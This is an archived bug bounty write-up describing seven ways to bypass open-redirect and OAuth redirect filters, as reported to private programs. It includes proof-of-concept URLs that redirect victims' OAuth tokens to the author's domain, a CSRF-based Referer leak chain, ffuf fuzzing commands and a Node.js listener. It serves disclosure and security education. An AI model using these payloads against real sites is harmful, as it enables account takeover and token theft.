---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-19_bypassing-the-redirect-filters-with-7-ways.md
original_filename: 2020-11-19_bypassing-the-redirect-filters-with-7-ways.md
title: Bypassing the Redirect filters with 7 ways
category: documents
detected_topics:
- oauth
- idor
- command-injection
- otp
- rate-limit
- automation-abuse
tags:
- imported
- documents
- oauth
- idor
- command-injection
- otp
- rate-limit
- automation-abuse
language: en
raw_sha256: 752b7181cf3bda20ed75852a60e299f1ca4bee2f9da9f86276d6fee3ab1acae8
text_sha256: 490fada696b66354b83ceb7fcc2dbcad91e274279c7a4f43c192ad2185dfdf1d
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing the Redirect filters with 7 ways

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-19_bypassing-the-redirect-filters-with-7-ways.md
- Source Type: markdown
- Detected Topics: oauth, idor, command-injection, otp, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `752b7181cf3bda20ed75852a60e299f1ca4bee2f9da9f86276d6fee3ab1acae8`
- Text SHA256: `490fada696b66354b83ceb7fcc2dbcad91e274279c7a4f43c192ad2185dfdf1d`


## Content

---
title: "Bypassing the Redirect filters with 7 ways"
url: "https://elmahdi.tistory.com/m/4"
final_url: "https://elmahdi.tistory.com/m/4"
authors: ["ElMahdi Mrhassel (@ElMrhassel)"]
bugs: ["Open redirect", "OAuth"]
publication_date: "2020-11-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4117
---

[카테고리 없음](/m/category)

### Bypassing the Redirect filters with 7 ways

elmahdi 2020\. 11. 19. 05:52

Hello Bug Bounty Hunters, In this writeup I will be explaining various scenarios on how to bypass Open Redirect Filters that will lead to Open Redirect> ATO

#### [0x01] Bypass the OAUTH Protection Via Path-URI Open redirect: 

I already reported a report about simple OAUTH-Token that can lead the attacker to steal the victim’s token without any special trick, It was just like [/oauth?redirect=httpx://mahdi.com/](http:///oauth?redirect=httpx://mahdi.com/)[ ](http:///oauth?redirect=httpx://mahdi.com/)and the site will redirect the victim to my website with the token of course, the bug was fixed so I started to look if I can find another way to bypass it via common open redirect payloads but nothing worked for me so far, So I looked for another open redirect in website but i can’t find any endpoint that’s may be vulnerable to open redirect! 

Then I remembered to check for an Open-Redirect that’s based On Path-URI and I found that’s website is vulnerable to it WOAH! :

[https://www.target01.com//mahdi.com/ ](http://www.target01.com//mahdi.com/)It will Redirect you to [//mahdi.com/](https://mahdi.com/)

and because the filter accept any path with Valid Host I Can use that open redirect to steal token: Proof Of Concept: 
  
  
  https://www.target01.com/api/OAUTH/?next=https://www.target01.com//mahdi.com/> https://www.target01.com//mahdi.com/?token =xxx&email=xx...> https://mahdi.com/?token=xxx&email=xx..

#### [0x02] Bypass the OAUTH Protection Via [%09]:

After they fix that Open Redirect URI-Path I tried again to bypass the protection on that OAUTH Endpoint so I started fuzzing with some tricks %5c @. … until %09 i noticed it is accepted! So I tried like this 
  
  
  https://www.target01.com/api/OAUTH?next=https://www.target01.com%09.mahdi.com

After the victim visits the URL the parser will delete the [www.target01.com](http://www.target01.com) and redirect the token to my website !!  Proof of Concpt: 
  
  
  https://www.target01.com/api/OAUTH?next=https://www.target01.com%09.mahdi.com> https://www.mahdi.com/?token=xxxx&email=... .

#### [0x03] Bypass the OAUTH Protection Via [Double encode for (.) %252E]:

After they fix that bypass [%09] I went to OAUTH Endpoint in order to bypass it :D again, After fuzzing manually and trying some tricks I found that the double encode which is %2e is accepted! And after visiting with the backend double-decode it will redirect to my website so I can redirect the token and access to it via create subdomain in my website with target domain name in order to bypass the domain whitelisting…

Proof Of Concept: 
  
  
  www.target01.com/api/OAUTH/?next=https://www.target01.com%252e.mahdi.com> www.target01.com.mahdi.com/?token=xxxx&email=....

#### [0x04] Bypass The OAUTH Protection Again: 

So I tried to look more and discover all the functionalities of the website and at the same time searching for any function that can allow me to set an external URL in img tag or a tag and I had the chance to figured out that there's only one place that users can set any external domain for their project but this one wasn't enough for me, the impact is maybe not as I want (Because the projects are only accessible for the members of the team), to make this bug more impactful I needed to find a way to enforce other users to join the team, So I checked if there's any CSRF OR IDOR to increase the impact, after some digging here and there I founded that Join team endpoint is not protected against CSRF which force users to join team!!!after the victim join the project I redirect them to the endpoint of OAUTH with the Project-Page AND the token will be redirect to the Project-Page, when the victim click on Project-domain the token will be leaked through Referer, the attacker process like this:

Attacker make an page in his website with the following things:

Image tag with Invite URL As value, Wait some seconds and Redirect user to OAUTH Endpoint with Project-Page Like this:
  
  
  https://www.target01.com/api/OAUTH/?next=https://www.target01.com/project/team> https://www.target01.com/project/team?token=xxx&email ...

when victim click on the Project-Domain and the token will be leaked through Referer to attacker website

#### [0x05] Account Takeover Through Bypass the Filter with [%5b]:

I already reported a simple OAUTH Bug to another private program after some weeks they fixed it, I said to myself of course there’s a bypass for this one too so let’s try to bypass it (I like to speak internally with me :D). so I looked for a way to bypass the fix with common ways but none of them worked for me, after a while, an idea came to my mind to try FUZZ with URL-Encode chars and look how the parser will deal with the encoding! So I copied the endpoint that redirects the token to valid URL and started fuzzing it with [URL-Encode-chars.txt ](https://pastebin.com/raw/b7HsBvZ7)In Intruder (Burp-Suite)
  
  
  https://target02.com/api/oauth?code=&state=https://Mahdi.com$FUZZ$.target02.com/

After the Intruder completed, I started checking the results one by one and I noticed that’s / has been added before [ Woh holly-sh*t it become like this [Mahdi.com/[.target02.com ](http://Mahdi.com/\[.target.com)so this one makes me able to steal the token of the victim by redirecting him to my website.

Proof Of Concept: 
  
  
  http://target02.com/oauth?redirect_uri=https://Mahdi.com[.target02.com/> https://target02.com/api/oauth?code=&state=https://Mahdi.com[ .target02.com/> https://Mahdi.com/[.target02.com/?code=xxxx..

#### [0x06] Bypass the Open-Redirect filter via special Char in Safari: 

While testing a website, I usually look for Open Redirect Bugs quite often 

So, I was testing a website let's say [target03.com](https://target03.com), I was trying to bypass a Open Redirect on the parameter “next=”

After trying to Bypass the Filter all my attempts has been failed so i said to myself that this is the time for fuzzing with 

[URL-Encode-Chars](https://pastebin.com/raw/b7HsBvZ7)

with dot and let's see how many special characters thats can be accepted and make the backend redirect me to my website with target domain and special char as subdomain, so i run the following command:

I am using the tool FFUF ❤
  
  
  ffuf -w URL-Encode-chars.txt -u https://www.target03.com/endpoit/protected?next=https:/www.target.comFUZZ.MY_VPS_IP

and thats what i Found! there's Many special chars is accepted by the backend like: $=()_*! , So i create an NodeJS File serve.js in my VPS with this following content:
  
  
  var http = require('http');
  var url = require('url');
  var fs = require('fs');
  var port = 80
  
  http.createServer(function(req, res) {
  res.writeHead(200, {'Content-Type':'text/html'});
  res.write('safari open-redirect-poc');
  res.end();
  
  }).listen(port, '0.0.0.0');
  console.log(`Serving on port ${port}`);

run this following command And use xip.io for wildcard DNS Record
  
  
  forever start serve.js

So i'm able to redirect users to malicious website through visit this URL in Safari Browser
  
  
  https://www.target03.com/endpoint/protected?next=https://www.target03.com*.MY_VPS_IP.xip.io

#### [0x07] Finding the Whitelist Words to bypass the Open-Redirect Filter:

While I was Relaxing on a sunday evening I received a notification regarding an Open-redirect Old-report has been fixed so quickly I started trying to bypass the Filter with all the ways thats i know :(Then all of a sudden a idea came to my mind to brute-force with 

[large-words-list.txt](https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt)

and check If there's any expired domain in the whitelist:
  
  
  ffuf -w words.txt -u https://www.target.com/endpoint?u=https://www.FUZZ.com/

and I found some websites is in the whitelist like google.com, youtube.com, twitter.com, rss-twitter.com, share-twitter.com ... 

![](https://blog.kakaocdn.net/dna/blZqpM/btqNNhl2tAa/AAAAAAAAAAAAAAAAAAAAAMqmjovreg3mgwwJGFPM6XVlE4lpMF0LT__ekTwcv2L2/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1782831599&allow_ip=&allow_referer=&signature=ThwwTasdTOqI1QCKikexV9RD3XM%3D)

Ummm... . share-twitter.com, rss-twitter.com I tried visiting those domains in my browser and I found both of them are expired and I can buy that domains!! OHHH! I immediately Reported the bypass:

Bypass Open Redirect Filter through buy that domains

After some hours, Reporting the open redirect bypass I realized that maybe that website is not in whitelist but “twitter” word which is in whitelist and that's what i found the twitter word is in whitelist so we can redirect user to any website thats contain twitter word in the end of the url like:
  
  
  https://www.target.com/endpoint?u=https://Mahditwitter.com/

Thank you for reading and for your time reading my writeup, Please follow me on twitter [@ElMrhassel ](https://twitter.com/ElMrhassel) and thanks to [@ArmanSameer95 ](https://twitter.com/ArmanSameer95) [@Yukusawa18](https://twitter.com/Yukusawa18) [@debangshu_kundu ](https://twitter.com/debangshu_kundu)for helping me write this writeup Thankyou ❤️
